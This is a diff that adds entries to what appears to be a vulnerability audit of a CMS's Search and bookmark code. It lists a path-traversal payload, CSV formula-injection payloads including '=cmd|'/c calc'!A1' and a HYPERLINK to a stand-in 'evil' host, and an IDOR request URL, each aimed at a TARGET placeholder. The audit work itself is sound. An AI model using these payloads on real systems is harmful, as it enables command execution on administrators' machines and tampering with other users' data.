@@ -167,3 +167,28 @@ Frontend module params are prefixed `cntnt01`; admin module params are prefixed 
   ```
 - **Payload:** `cmd=mkdir&val=foo/../../evil` (traversal), or `cmd=del&val=<file>`, or `cmd=upload`
 - **Description:** The action performs no permission check, so any authenticated admin — even one without "Modify Files" — can create/delete/upload files via the always-permissive default profile. The `mkdir` value is not `basename()`-restricted (unlike `del`), so a mid-path `../` creates directories outside the sandbox.
+
+---
+
+## 14. CSV / Formula Injection — Search word export (unauthenticated seed)
+- **Name:** CSV Formula Injection (CWE-1236)
+- **File:** `modules/Search/action.defaultadmin.php:29` (word written to CSV with no formula-escaping and no quote-doubling); words are seeded by unauthenticated frontend search via `action.dosearch.php`
+- **URL:**
+  ```
+  seed  (unauth): https://TARGET/index.php?mact=Search,cntnt01,dosearch,0&cntnt01searchinput==cmd|'/c calc'!A1
+  export (admin): https://TARGET/admin/moduleinterface.php?mact=Search,m1_,defaultadmin,0&__c=KEY&m1_exportcsv=1
+  ```
+- **Payload:** search for `=cmd|'/c calc'!A1` or `=HYPERLINK("http://evil/")` (stored as a search word)
+- **Description:** Anonymous users seed `module_search_words`; when a "Manage Search" admin exports the stats to `search.csv` and opens it in a spreadsheet, a leading `=`/`+`/`-`/`@` value executes as a formula. Embedded `"` is also not doubled, breaking CSV field quoting.
+
+---
+
+## 15. IDOR — bookmarks lack ownership checks
+- **Name:** Insecure Direct Object Reference (CWE-639)
+- **File:** `admin/deletebookmark.php:30-42` (loads and deletes by `bookmark_id` with no owner check); `admin/editbookmark.php:59-67` (saves by client `bookmark_id`, reassigning `user_id` to the actor)
+- **URL:**
+  ```
+  https://TARGET/admin/deletebookmark.php?__c=KEY&bookmark_id=<victim_bookmark_id>
+  ```
+- **Payload:** `bookmark_id` belonging to another user
+- **Description:** Any admin can delete another user's bookmark by ID, or via `editbookmark` overwrite another user's bookmark and reassign it to themselves — neither verifies the bookmark belongs to the current user. Low impact (per-user bookmarks).
